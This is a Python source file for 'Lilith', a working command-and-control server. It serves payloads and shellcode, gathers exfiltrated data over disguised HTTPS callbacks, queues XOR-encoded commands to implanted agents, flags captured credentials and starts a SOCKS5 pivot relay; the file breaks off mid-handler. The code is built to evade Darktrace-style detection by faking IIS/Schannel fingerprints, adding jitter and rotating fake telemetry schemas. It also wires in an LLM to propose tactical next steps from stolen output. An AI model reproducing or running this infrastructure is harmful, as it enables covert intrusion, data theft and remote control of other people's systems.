"""
Lilith — HTTPS Payload Server + Callback Listener + C2 Management API

Stealth hardening vs Darktrace:
  - IIS/Schannel cipher suite order → JA3S fingerprint matches Windows Server
  - OP_NO_TICKET: disable TLS session tickets (Schannel doesn't advertise them)
  - Microsoft-IIS/10.0 + ASP.NET response headers on every response
  - Basename-only file lookup: any CDN-like path resolves to workspace file
  - POST callback: any path ending in /{token} accepted
  - JSON telemetry wrapper decoded transparently
  - 50–200 ms per-response jitter breaks timing analysis

C2 agent protocol (localhost management API on separate plain-HTTP port):
  - POST {cb_prefix}/c2/register       ← agent registers, gets XOR key
  - GET  {cb_prefix}/{sid}/task        ← agent polls for pending command
  - POST {cb_prefix}/{sid}/{task_id}   ← agent posts command output
  - GET  /mgmt/sessions                ← list active C2 sessions (mgmt API)
  - POST /mgmt/{sid}/task              ← push command to session (mgmt API)
  - GET  /mgmt/{sid}/result/{tid}      ← poll for result (mgmt API)
"""

import ssl
import http.server
import os
import json
import base64
import queue
import random
import time
import secrets
import threading
import collections
import hashlib
import socketserver
from datetime import datetime, timedelta

from server.certs import ensure_certs
from server.ui import handle_ui_request as _handle_ui, set_workspace as _set_ui_workspace

# ── IIS/Schannel TLS cipher preference ──────────────────────────────────────
_IIS_CIPHERS = (
    "ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-RSA-AES256-SHA384:"
    "ECDHE-RSA-AES128-SHA256:"
    "AES256-GCM-SHA384:"
    "AES128-GCM-SHA256:"
    "AES256-SHA256:"
    "AES128-SHA256"
)

_IIS_HEADERS = {
    "Server":                 "Microsoft-IIS/10.0",
    "X-Powered-By":           "ASP.NET",
    "X-AspNet-Version":       "4.0.30319",
    "X-Content-Type-Options": "nosniff",
    "Cache-Control":          "no-store, no-cache, must-revalidate",
    "Pragma":                 "no-cache",
    "Vary":                   "Accept-Encoding",
}

_MIME = {
    ".dat":  "application/octet-stream",
    ".enc":  "application/octet-stream",
    ".exe":  "application/octet-stream",
    ".ps1":  "text/plain; charset=utf-8",
    ".xml":  "application/xml",
    ".json": "application/json",
    ".msi":  "application/x-msi",
    ".html": "text/html; charset=utf-8",
    ".js":   "application/javascript",
    ".apk":  "application/vnd.android.package-archive",
    ".sh":   "text/plain; charset=utf-8",
    ".elf":  "application/octet-stream",
}

_EXFIL_LOG: list[tuple[str, str, str]] = []
_START_TIME  = time.time()
_SERVER_BASE = "https://localhost:8443"   # overwritten by start_server

# ── Multi-operator auth ───────────────────────────────────────────────────────
# _OPERATORS: {username: {hash: str, role: "admin"|"operator", created_at: str}}
# role "admin" can create/delete operators; "operator" can only use the C2
_OPERATORS: dict = {}
_UI_TOKENS: set[str] = set()   # legacy single-token compat (auto-creates "admin" operator)
_UI_SESSIONS: dict   = {}      # cookie_val → {username, expiry, role}
_UI_SESS_TTL = 28800           # 8h

def _op_hash(password: str) -> str:
    return hashlib.pbkdf2_hmac("sha256", password.encode(), b"lilith-op-salt", 200_000).hex()

def set_ui_token(token: str) -> None:
    """Legacy compat: creates/updates the 'admin' operator with this token as password."""
    t = token.strip()
    if t:
        _UI_TOKENS.add(t)
        _OPERATORS["admin"] = {"hash": _op_hash(t), "role": "admin",
                               "created_at": datetime.now().isoformat(timespec="seconds")}

def add_operator(username: str, password: str, role: str = "operator") -> None:
    _OPERATORS[username.strip()] = {"hash": _op_hash(password), "role": role,
                                    "created_at": datetime.now().isoformat(timespec="seconds")}

def _ui_auth_ok(headers) -> bool:
    """Returns True if the request carries a valid session cookie."""
    if not _OPERATORS:
        return True
    return bool(_get_operator(headers))

def _get_operator(headers) -> dict | None:
    """Returns {username, role} if session cookie is valid, else None."""
    for part in headers.get("Cookie", "").split(";"):
        k, _, v = part.strip().partition("=")
        if k.strip() == "lilith_sess":
            sess = _UI_SESSIONS.get(v.strip())
            if sess and sess["expiry"] > datetime.now():
                return {"username": sess["username"], "role": sess["role"]}
    return None

_LOGIN_HTML_TPL = (
    '<!doctype html><html><head><meta charset="utf-8"><title>LILITH</title>'
    '<style>'
    '*{{box-sizing:border-box;margin:0;padding:0}}'
    'body{{height:100vh;display:flex;align-items:center;justify-content:center;'
    'background:#050505;color:#ccc;font:12px/1.5 "Cascadia Code",monospace;overflow:hidden;'
    'background-image:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(185,28,28,.015) 2px,rgba(185,28,28,.015) 4px)}}'
    '@keyframes scanline{{0%{{top:-10%}}100%{{top:110%}}}}'
    '.scan{{position:fixed;left:0;width:100%;height:3px;background:linear-gradient(transparent,rgba(185,28,28,.08),transparent);'
    'animation:scanline 6s linear infinite;pointer-events:none;z-index:0}}'
    '@keyframes pulse{{0%,100%{{opacity:.6;text-shadow:0 0 8px #b91c1c}}50%{{opacity:1;text-shadow:0 0 24px #ef4444,0 0 40px #b91c1c}}}}'
    'form{{display:flex;flex-direction:column;gap:14px;min-width:320px;'
    'padding:36px 32px;border:1px solid #1c1c1c;background:rgba(10,10,10,.95);'
    'position:relative;z-index:1;box-shadow:0 0 40px rgba(185,28,28,.12),inset 0 0 60px rgba(0,0,0,.5)}}'
    'form::before{{content:"";position:absolute;top:0;left:0;right:0;height:2px;'
    'background:linear-gradient(to right,transparent,#b91c1c,transparent)}}'
    '.sigil{{font-size:28px;text-align:center;color:#b91c1c;animation:pulse 3s ease-in-out infinite;margin-bottom:4px}}'
    '.logo{{font-size:18px;font-weight:700;color:#ef4444;letter-spacing:.1em;'
    'text-align:center;text-shadow:0 0 16px rgba(239,68,68,.4)}}'
    '.logo span{{color:#444;font-weight:400}}'
    '.sub{{text-align:center;font-size:9px;letter-spacing:.2em;color:#3a3a3a;text-transform:uppercase;margin-bottom:4px}}'
    'input{{background:#0a0a0a;border:1px solid #1c1c1c;color:#d4d4d4;'
    'font:12px "Cascadia Code",monospace;padding:9px 12px;border-radius:0;'
    'transition:border-color .2s,box-shadow .2s;outline:none}}'
    'input:focus{{border-color:#b91c1c;box-shadow:0 0 0 1px rgba(185,28,28,.3)}}'
    'input::placeholder{{color:#2a2a2a}}'
    'button{{background:transparent;border:1px solid #b91c1c;color:#ef4444;'
    'font:12px "Cascadia Code",monospace;padding:10px;cursor:pointer;'
    'letter-spacing:.2em;text-transform:uppercase;transition:all .2s;position:relative;overflow:hidden}}'
    'button::before{{content:"";position:absolute;top:0;left:-100%;width:100%;height:100%;'
    'background:linear-gradient(90deg,transparent,rgba(185,28,28,.15),transparent);'
    'transition:left .4s}}'
    'button:hover{{background:rgba(185,28,28,.12);color:#fff;border-color:#ef4444;box-shadow:0 0 12px rgba(185,28,28,.3)}}'
    'button:hover::before{{left:100%}}'
    '.err{{color:#f87171;font-size:10px;text-align:center;letter-spacing:.06em}}'
    '</style></head><body>'
    '<div class="scan"></div>'
    '<form method="post" action="/ui/login">'
    '<div class="sigil">⬡</div>'
    '<div class="logo">LILITH <span>// C2</span></div>'
    '<div class="sub">Operator Authentication</div>'
    '{err}'
    '<input type="text" name="username" placeholder="username" autofocus autocomplete="username">'
    '<input type="password" name="password" placeholder="password" autocomplete="current-password">'
    '<button type="submit">▶ AUTHENTICATE</button>'
    '</form></body></html>'
)

# ── Engagement DB (optional — set by cmd_serve) ──────────────────────────────
_ENGAGE_DB = None   # type: core.engage.EngagementDB | None

def set_engage_db(db) -> None:
    global _ENGAGE_DB
    _ENGAGE_DB = db

# ── SSE pub/sub ──────────────────────────────────────────────────────────────
_sse_clients: list = []
_sse_lock = threading.Lock()

def _sse_publish(event: dict) -> None:
    with _sse_lock:
        dead = [q for q in _sse_clients if not _sse_send(q, event)]
        for q in dead:
            _sse_clients.remove(q)

def _sse_send(q: queue.Queue, event: dict) -> bool:
    try:
        q.put_nowait(event)
        return True
    except queue.Full:
        return False

# ── C2 session registry ──────────────────────────────────────────────────────
_C2_SESSIONS: dict = {}
_C2_LOCK = threading.Lock()
_AUTO_ANALYZE_TS: dict[str, float] = {}
_AUTO_ANALYZE_INTERVAL = 30.0  # seconds between auto-analysis per session


def _c2_new_session(session_id: str, host: str) -> int:
    key = secrets.randbelow(255) + 1  # 1-255, full byte range
    with _C2_LOCK:
        _C2_SESSIONS[session_id] = {
            "host":      host,
            "key":       key,
            "tasks":     collections.deque(),
            "results":   {},
            "last_seen": datetime.now(),
        }
    if _ENGAGE_DB:
        _ENGAGE_DB.set_c2_key(session_id, key)
    return key


def restore_c2_sessions_from_db(db) -> int:
    """Reload live C2 sessions from the engagement DB after a server restart.
    The agent still holds its XOR key; this restores it so new tasks can be dispatched."""
    count = 0
    for row in db.get_live_sessions():
        sid = row["id"]
        key = row.get("c2_key", 0)
        if not key:
            continue  # skip sessions without stored key — agent will re-register
        with _C2_LOCK:
            if sid not in _C2_SESSIONS:
                _C2_SESSIONS[sid] = {
                    "host":      row.get("host", "?"),
                    "key":       key,
                    "tasks":     collections.deque(),
                    "results":   {},
                    "last_seen": datetime.now(),
                }
                count += 1
    return count


def _c2_push_task(session_id: str, command: str, operator: str = "") -> str | None:
    with _C2_LOCK:
        sess = _C2_SESSIONS.get(session_id)
        if not sess:
            return None
        task_id = secrets.token_hex(8)   # 16-char hex
        sess["tasks"].append((task_id, command))
        # Store operator attribution alongside task history
        sess.setdefault("task_ops", {})[task_id] = operator or "unknown"
    return task_id


def _c2_pop_task(session_id: str) -> tuple[str, str] | None:
    with _C2_LOCK:
        sess = _C2_SESSIONS.get(session_id)
        if not sess or not sess["tasks"]:
            return None
        sess["last_seen"] = datetime.now()
        return sess["tasks"].popleft()


def _c2_store_result(session_id: str, task_id: str, output: str) -> None:
    with _C2_LOCK:
        sess = _C2_SESSIONS.get(session_id)
        if sess:
            sess["results"][task_id] = (datetime.now(), output)
            sess["last_seen"] = datetime.now()
            # Evict oldest result when over 500 to prevent unbounded growth
            if len(sess["results"]) > 500:
                oldest = min(sess["results"], key=lambda k: sess["results"][k][0])
                del sess["results"][oldest]


def _auto_analyze_result(session_id: str, task_id: str, output: str, has_creds: bool) -> None:
    """Fire Astaroth auto-analysis in a background thread when a C2 result arrives."""
    clean = output.strip()
    if len(clean) < 80:
        return
    if clean == "#< CLIXML" or clean.rstrip() == "#< CLIXML":
        return

    # Rate-limit: max one auto-analysis per session per interval (cred results bypass throttle)
    if not has_creds:
        now = time.monotonic()
        last = _AUTO_ANALYZE_TS.get(session_id, 0.0)
        if now - last < _AUTO_ANALYZE_INTERVAL:
            return
        _AUTO_ANALYZE_TS[session_id] = now

    # Skip silently if neither Claude API nor Ollama is configured
    if not os.environ.get("ANTHROPIC_API_KEY", "").strip():
        try:
            import urllib.request as _ur
            ollama = os.environ.get("ASTAROTH_OLLAMA_URL", "http://localhost:11434")
            _ur.urlopen(f"{ollama}/api/tags", timeout=0.5)
        except Exception:
            return

    import secrets as _sec, threading
    try:
        from server.astaroth import consult_stream
    except Exception:
        return

    with _C2_LOCK:
        sess = _C2_SESSIONS.get(session_id, {})
        last_seen = sess.get("last_seen", datetime.now())
        host = sess.get("host", "?")

    context = {
        "session": {"id": session_id, "host": host},
        "live":    {"last_seen": last_seen.strftime("%H:%M:%S"), "stale": False},
        "recent_outputs": [{"command": f"[task:{task_id[:8]}]", "output": clean[:3000]}],
        "credentials": [],
        "techniques": [],
    }

    stream_id = "auto_" + _sec.token_hex(6)
    _sse_publish({"type": "ast_auto_start", "stream_id": stream_id,
                  "task_id": task_id, "session_id": session_id})

    question = (
        "Auto-analysis — review the output above and give immediate tactical next steps. "
        "What does this reveal? What should the operator do next?"
    )

    def _run():
        consult_stream(question, context, stream_id, _sse_publish, session_id=session_id)

    threading.Thread(target=_run, daemon=True).start()


def _c2_get_result(session_id: str, task_id: str) -> str | None:
    """Return the result for task_id (persistent — not consumed on fetch)."""
    with _C2_LOCK:
        sess = _C2_SESSIONS.get(session_id)
        if not sess:
            return None
        entry = sess["results"].get(task_id)
        return entry[1] if entry else None


def _c2_encode_task(task_id: str, command: str, key: int) -> bytes:
    """XOR(task_id[16] || '|' || command) with the established session key.
    Key is NOT prepended to the wire payload — the agent uses the key from
    its registration response, so an observer cannot recover the key from
    the task packet alone."""
    payload = (task_id + "|" + command).encode("utf-8")
    return bytes([b ^ key for b in payload])


_SESSION_STALE_S = 90   # seconds since last_seen before a session is considered dead

def _c2_kill_session(session_id: str) -> bool:
    with _C2_LOCK:
        if session_id in _C2_SESSIONS:
            del _C2_SESSIONS[session_id]
            return True
    return False


def get_c2_sessions() -> dict:
    now = datetime.now()
    with _C2_LOCK:
        return {
            sid: {
                "host":      s["host"],
                "key":       s["key"],
                "pending":   len(s["tasks"]),
                "results":   len(s["results"]),
                "last_seen": s["last_seen"].strftime("%H:%M:%S"),
                "stale":     (now - s["last_seen"]).total_seconds() > _SESSION_STALE_S,
            }
            for sid, s in _C2_SESSIONS.items()
        }


# ── HTTPS handler ────────────────────────────────────────────────────────────

class _Handler(http.server.BaseHTTPRequestHandler):
    workspace: str = ""
    callback_prefix: str = "/api/diagnostics"

    def do_GET(self):
        raw_path = self.path.split("?")[0]
        parts = [p for p in raw_path.strip("/").split("/") if p]

        # C2 task poll: GET {callback_prefix}/{session_id}/task
        if raw_path.startswith(self.callback_prefix) and raw_path.endswith("/task"):
            session_id = parts[-2] if len(parts) >= 2 else ""
            self._handle_c2_poll(session_id)
            return

        # C2 agent SC fetch (used by migrate command in agent)
        if raw_path.startswith(self.callback_prefix) and raw_path.endswith("/c2/agent-sc"):
            self._handle_agent_sc()
            return

        # SSE event stream (requires auth when token is configured)
        if raw_path == "/ui/api/stream":
            if not _ui_auth_ok(self.headers):
                self.send_response(401); self.end_headers(); return
            self._handle_sse()
            return

        # Purple team web UI
        if raw_path.startswith("/ui"):
            # login page — unauthenticated
            if raw_path.rstrip("/") == "/ui/login":
                err = '<div class="err">invalid token</div>' if "err=1" in self.path else ""
                body = _LOGIN_HTML_TPL.format(err=err).encode()
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            if not _ui_auth_ok(self.headers):
                self.send_response(302)
                self.send_header("Location", "/ui/login")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            db = _ENGAGE_DB
            if db is None:
                body = b'{"error":"db not initialized"}'
                self.send_response(503)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            status, ct, resp = _handle_ui("GET", self.path, b"", db, self.headers)
            self.send_response(status)
            self.send_header("Content-Type", ct)
            self.send_header("Content-Length", str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)
            return

        # File serve: any CDN-like path resolves to workspace basename
        basename = os.path.basename(raw_path)
        full = os.path.join(self.workspace, basename)
        if not basename or not os.path.isfile(full):
            self._send_iis_404()
            return

        time.sleep(random.uniform(0.05, 0.20))

        with open(full, "rb") as f:
            data = f.read()

        ext  = os.path.splitext(basename)[1].lower()
        mime = _MIME.get(ext, "application/octet-stream")

        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   mime)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Last-Modified",  "Tue, 15 Jan 2025 08:00:00 GMT")
        self.send_header("ETag",           f'"{len(data):x}-{hashlib.md5(data).hexdigest()[:8]}"')
        self.end_headers()
        self.wfile.write(data)

        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] GET  {raw_path} → {self.client_address[0]}  ({len(data):,}B)")
        _sse_publish({"type": "file_served", "name": basename, "client": self.client_address[0],
                      "size": len(data), "ts": ts})
        if _ENGAGE_DB:
            _ENGAGE_DB.log_event("file_served",
                                 f"{basename} → {self.client_address[0]}",
                                 extra={"path": raw_path, "size": len(data), "client": self.client_address[0]})

    def do_POST(self):
        raw_path = self.path.rstrip("/")
        parts = [p for p in raw_path.strip("/").split("/") if p]

        length = int(self.headers.get("Content-Length", 0))
        body_raw = self.rfile.read(length) if length else b""

        # UI login (unauthenticated)
        if raw_path.rstrip("/") == "/ui/login":
            self._handle_ui_login(body_raw)
            return

        # Purple team web UI (POST — label endpoint)
        if raw_path.startswith("/ui"):
            if not _ui_auth_ok(self.headers):
                self.send_response(302)
                self.send_header("Location", "/ui/login")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            # logout (auth already checked above)
            if raw_path == "/ui/api/logout":
                self._handle_ui_logout()
                return
            db = _ENGAGE_DB
            if db is None:
                body = b'{"error":"db not initialized"}'
                self.send_response(503)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            status, ct, resp = _handle_ui("POST", raw_path, body_raw, db, self.headers)
            self.send_response(status)
            self.send_header("Content-Type", ct)
            self.send_header("Content-Length", str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)
            return

        # C2 agent registration: POST .../c2/register
        if raw_path.endswith("/c2/register"):
            self._handle_c2_register(body_raw)
            return

        # C2 result or regular callback — distinguish by session_id match
        token      = parts[-1] if parts else ""
        session_id = parts[-2] if len(parts) >= 2 else ""

        with _C2_LOCK:
            is_c2_result = session_id in _C2_SESSIONS

        if is_c2_result:
            self._handle_c2_result(session_id, token, body_raw)
        else:
            self._handle_callback(token, body_raw)

    def _handle_sse(self):
        q: queue.Queue = queue.Queue(maxsize=512)
        with _sse_lock:
            _sse_clients.append(q)
        try:
            self.send_response(200)
            self.send_header("Content-Type",  "text/event-stream")
            self.send_header("Cache-Control", "no-cache")
            self.send_header("Connection",    "keep-alive")
            self.end_headers()
            self.wfile.write(b'data: {"type":"hello"}\n\n')
            self.wfile.flush()
            while True:
                try:
                    msg = q.get(timeout=20)
                    self.wfile.write(("data: " + json.dumps(msg) + "\n\n").encode())
                    self.wfile.flush()
                except queue.Empty:
                    self.wfile.write(b": ping\n\n")
                    self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass
        finally:
            with _sse_lock:
                try:
                    _sse_clients.remove(q)
                except ValueError:
                    pass

    def do_DELETE(self):
        raw_path = self.path.rstrip("/")
        if raw_path.startswith("/ui"):
            if not _ui_auth_ok(self.headers):
                self.send_response(302)
                self.send_header("Location", "/ui/login")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            db = _ENGAGE_DB
            if db is None:
                body = b'{"error":"db not initialized"}'
                self.send_response(503)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            status, ct, resp = _handle_ui("DELETE", raw_path, b"", db, self.headers)
            self.send_response(status)
            self.send_header("Content-Type", ct)
            self.send_header("Content-Length", str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)
        else:
            self._send_iis_404()

    def _handle_ui_login(self, body: bytes):
        import urllib.parse
        try:
            fields = dict(urllib.parse.parse_qsl(body.decode()))
            username = fields.get("username", "").strip()
            pw       = fields.get("password", "").strip()
        except Exception:
            username = pw = ""

        op = _OPERATORS.get(username)
        # Legacy compat: if no named operators, fall back to token set
        if not _OPERATORS and pw in _UI_TOKENS:
            op = {"hash": _op_hash(pw), "role": "admin"}
            username = "admin"

        ok = op and secrets.compare_digest(op["hash"], _op_hash(pw))
        if ok:
            tok = secrets.token_urlsafe(32)
            _UI_SESSIONS[tok] = {"username": username, "role": op["role"],
                                 "expiry": datetime.now() + timedelta(seconds=_UI_SESS_TTL)}
            self.send_response(302)
            self.send_header("Set-Cookie",
                f"lilith_sess={tok}; HttpOnly; SameSite=Strict; Path=/; Max-Age={_UI_SESS_TTL}")
            self.send_header("Location", "/ui/")
            self.send_header("Content-Length", "0")
            self.end_headers()
        else:
            self.send_response(302)
            self.send_header("Location", "/ui/login?err=1")
            self.send_header("Content-Length", "0")
            self.end_headers()

    def _handle_ui_logout(self):
        for part in self.headers.get("Cookie", "").split(";"):
            k, _, v = part.strip().partition("=")
            if k.strip() == "lilith_sess":
                _UI_SESSIONS.pop(v.strip(), None)
        self.send_response(302)
        self.send_header("Set-Cookie", "lilith_sess=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0")
        self.send_header("Location", "/ui/login")
        self.send_header("Content-Length", "0")
        self.end_headers()

    # ── C2 handlers ───────────────────────────────────────────────────────────

    def _handle_agent_sc(self):
        """Serve the C2 agent shellcode (.enc) for in-agent migration."""
        sc_path = _find_agent_sc(self.workspace)
        if not sc_path:
            self._send_iis_404()
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"[{ts}] [!] agent-sc requested but not found in workspace — run: lilith build --runner")
            return
        with open(sc_path, "rb") as f:
            data = f.read()
        time.sleep(random.uniform(0.05, 0.15))
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] AGENT-SC  src={self.client_address[0]}  ({len(data):,}B)  [migration request]")

    def _handle_c2_register(self, body: bytes):
        try:
            data = json.loads(body)
            session_id = data.get("machineId", secrets.token_hex(8))
        except Exception:
            session_id = secrets.token_hex(8)

        key = _c2_new_session(session_id, self.client_address[0])
        resp = json.dumps({"key": key}).encode()
        time.sleep(random.uniform(0.05, 0.15))
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   "application/json")
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)

        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n[{ts}] C2 REGISTER  session={session_id}  src={self.client_address[0]}  key=0x{key:02X}\n")
        if _ENGAGE_DB:
            _ENGAGE_DB.log_session(session_id, self.client_address[0])
            _ENGAGE_DB.log_event("register", f"src={self.client_address[0]}", session_id=session_id)
        _sse_publish({"type": "session_new", "id": session_id, "host": self.client_address[0], "ts": ts})

    def _handle_c2_poll(self, session_id: str):
        time.sleep(random.uniform(0.05, 0.15))
        # Update last_seen on every poll so --list accurately shows agent liveness
        with _C2_LOCK:
            sess = _C2_SESSIONS.get(session_id)
            if sess:
                sess["last_seen"] = datetime.now()
        task = _c2_pop_task(session_id)
        if task is None:
            self.send_response(200)
            self._add_iis_headers()
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        task_id, command = task
        with _C2_LOCK:
            key = _C2_SESSIONS[session_id]["key"]

        encoded = _c2_encode_task(task_id, command, key)
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   "application/octet-stream")
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)

        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] C2 TASK  session={session_id}  task={task_id}  cmd={command!r}")
        if _ENGAGE_DB:
            _ENGAGE_DB.log_task(task_id, session_id, command)
            _ENGAGE_DB.touch_session(session_id)

    def _handle_c2_result(self, session_id: str, task_id: str, body: bytes):
        output = _decode_exfil(body)
        _c2_store_result(session_id, task_id, output)

        resp = b'{"status":"ok","code":0}'
        time.sleep(random.uniform(0.05, 0.15))
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   "application/json")
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)

        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n{'─'*60}")
        print(f"[{ts}] C2 RESULT  session={session_id}  task={task_id}")
        print(f"{'─'*60}")
        print(output.rstrip() if output.strip() else "[no output]")
        print(f"{'─'*60}\n")
        has_creds = False
        if _ENGAGE_DB:
            is_bin = output.startswith("_BIN_B64:\n")
            _ENGAGE_DB.log_result(task_id, session_id, output, is_binary=is_bin)
            _ENGAGE_DB.touch_session(session_id)
            from core.engage import detect_creds
            has_creds, _ = detect_creds(output)
        _sse_publish({"type": "task_result", "task_id": task_id, "session_id": session_id,
                      "has_creds": has_creds, "ts": datetime.now().strftime("%H:%M:%S")})
        _auto_analyze_result(session_id, task_id, output, has_creds)

    def _handle_callback(self, token: str, body: bytes):
        output = _decode_exfil(body)

        resp = b'{"status":"ok","code":0}'
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   "application/json")
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)

        ts = datetime.now().strftime("%H:%M:%S")
        _EXFIL_LOG.append((ts, token, output))
        print(f"\n{'─'*60}")
        print(f"[{ts}] CALLBACK  token={token}  src={self.client_address[0]}")
        print(f"{'─'*60}")
        print(output.rstrip())
        print(f"{'─'*60}\n")
        if _ENGAGE_DB:
            _ENGAGE_DB.log_event("callback",
                                 f"token={token} src={self.client_address[0]}",
                                 extra={"output_preview": output[:500]})

    # ── helpers ───────────────────────────────────────────────────────────────

    def _add_iis_headers(self):
        for k, v in _IIS_HEADERS.items():
            self.send_header(k, v)

    def _send_iis_404(self):
        body = b"<!DOCTYPE html><html><head><title>404 - Not Found</title></head><body><h2>404 - File or directory not found.</h2></body></html>"
        self.send_response(404)
        self._add_iis_headers()
        self.send_header("Content-Type",   "text/html; charset=UTF-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        pass


# ── Management API (plain HTTP, localhost only) ──────────────────────────────

class _MgmtHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        if self.client_address[0] not in ("127.0.0.1", "::1"):
            self.send_error(403); return

        path = self.path.split("?")[0].rstrip("/")
        parts = [p for p in path.strip("/").split("/") if p]

        # GET /mgmt/sessions
        if parts == ["mgmt", "sessions"]:
            body = json.dumps(get_c2_sessions(), indent=2).encode()
            self._json(body); return

        # GET /mgmt/{sid}/result/{tid}
        if len(parts) == 4 and parts[0] == "mgmt" and parts[2] == "result":
            sid, tid = parts[1], parts[3]
            result = _c2_get_result(sid, tid)
            if result is None:
                self.send_response(204); self.end_headers(); return
            self._json(json.dumps({"output": result}).encode()); return

        # GET /mgmt/payloads  — payload version history (Astaroth MCP integration point)
        if parts == ["mgmt", "payloads"]:
            from server.ui import _api_arsenal_versions
            body = json.dumps(_api_arsenal_versions(), indent=2).encode()
            self._json(body); return

        self.send_error(404)

    def do_DELETE(self):
        if self.client_address[0] not in ("127.0.0.1", "::1"):
            self.send_error(403); return

        path = self.path.split("?")[0].rstrip("/")
        parts = [p for p in path.strip("/").split("/") if p]

        # DELETE /mgmt/{sid}  — kill (forget) a session
        if len(parts) == 2 and parts[0] == "mgmt":
            sid = parts[1]
            ok = _c2_kill_session(sid)
            if not ok:
                self.send_error(404); return
            self._json(json.dumps({"status": "killed", "session": sid}).encode()); return

        self.send_error(404)

    def do_POST(self):
        if self.client_address[0] not in ("127.0.0.1", "::1"):
            self.send_error(403); return

        path = self.path.split("?")[0].rstrip("/")
        parts = [p for p in path.strip("/").split("/") if p]
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""

        # POST /mgmt/{sid}/task  body={"cmd":"..."}
        if len(parts) == 3 and parts[0] == "mgmt" and parts[2] == "task":
            sid = parts[1]
            try:
                cmd = json.loads(body).get("cmd", "")
            except Exception:
                self.send_error(400); return
            tid = _c2_push_task(sid, cmd)
            if tid is None:
                self.send_error(404); return
            self._json(json.dumps({"task_id": tid}).encode()); return

        self.send_error(404)

    def _json(self, body: bytes):
        self.send_response(200)
        self.send_header("Content-Type",   "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        pass


# ── Helpers ──────────────────────────────────────────────────────────────────

def _find_agent_sc(workspace_dir: str) -> str | None:
    """Return the path to the C2 agent shellcode .enc file, or None if not built."""
    manifest = os.path.join(workspace_dir, "manifest.json")
    if not os.path.exists(manifest):
        return None
    try:
        with open(manifest) as f:
            m = json.load(f)
    except Exception:
        return None
    sc_name = m.get("enc___runner_sc_c2__")
    if not sc_name:
        return None
    p = os.path.join(workspace_dir, sc_name)
    return p if os.path.exists(p) else None


def _decode_exfil(body: bytes) -> str:
    """
    Task 9 — Malleable C2: decode telemetry regardless of field name aliases.
    The agent rotates between multiple JSON schemas (DiagTrack, WER, AppInsights)
    so TLS-inspection fingerprinting cannot key on a fixed schema.
    We accept any of the known field name sets here.
    """
    try:
        data = json.loads(body)
        # Primary schema: {"events":[{"type":...,"data":"<b64>"}]}
        events = data.get("events", [])
        if events:
            entry = events[0]
            # Accept multiple field aliases for the payload field
            raw = entry.get("data") or entry.get("payload") or entry.get("value") or ""
            if raw:
                return base64.b64decode(raw).decode("utf-8", errors="replace")
            return ""   # valid JSON but empty data — don't echo raw JSON
        # Alternate schema: {"log":[{"msg":"<b64>"}]}
        for alt_key in ("log", "records", "entries"):
            alt = data.get(alt_key, [])
            if alt:
                raw = alt[0].get("msg") or alt[0].get("body") or ""
                if raw:
                    return base64.b64decode(raw).decode("utf-8", errors="replace")
        return body.decode("utf-8", errors="replace")
    except Exception:
        return body.decode("utf-8", errors="replace")


# ── SOCKS5 proxy server over C2 agent TCP relay ──────────────────────────────
import socket as _socket
import struct as _struct

_ACTIVE_SOCKS5: dict = {}   # session_id → {"thread": Thread, "server": TCPServer, "port": int}
_SOCKS5_LOCK   = threading.Lock()


def _c2_task_sync(session_id: str, command: str, timeout: float = 8.0) -> str | None:
    """Push task to agent and block until result arrives (or timeout)."""
    tid = _c2_push_task(session_id, command)
    if not tid:
        return None
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = _c2_get_result(session_id, tid)
        if result is not None:
            return result
        time.sleep(0.15)
    return None


class _Socks5Handler(socketserver.BaseRequestHandler):
    """One thread per SOCKS5 client connection. Routes via C2 agent TCP relay."""

    session_id: str = ""

    def handle(self):
        sid = self.session_id
        conn = self.request
        conn.settimeout(10)
        try:
            # --- SOCKS5 greeting ---
            hdr = conn.recv(2)
            if len(hdr) < 2 or hdr[0] != 5:
                return
            nmethods = hdr[1]
